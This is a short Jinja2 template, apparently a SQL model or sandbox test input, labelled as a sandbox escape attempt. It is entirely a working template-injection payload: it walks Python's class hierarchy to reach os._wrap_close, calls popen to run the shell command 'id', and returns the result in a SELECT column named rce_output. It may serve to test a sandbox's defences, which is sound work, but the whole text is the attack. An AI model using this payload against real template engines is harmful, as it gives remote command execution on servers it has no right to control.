{# Jinja2 sandbox escape attempt via object chain #}
{# Method 1: MRO chain to find os._wrap_close → popen #}
{% set ns = namespace(found=false, output='') %}

{# Try to access Python builtins via string class #}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == '_wrap_close' %}
    {% set ns.found = true %}
    {% set ns.output = c.__init__.__globals__['popen']('id').read() %}
  {% endif %}
{% endfor %}

SELECT '{{ ns.output }}' as rce_output, '{{ ns.found }}' as found
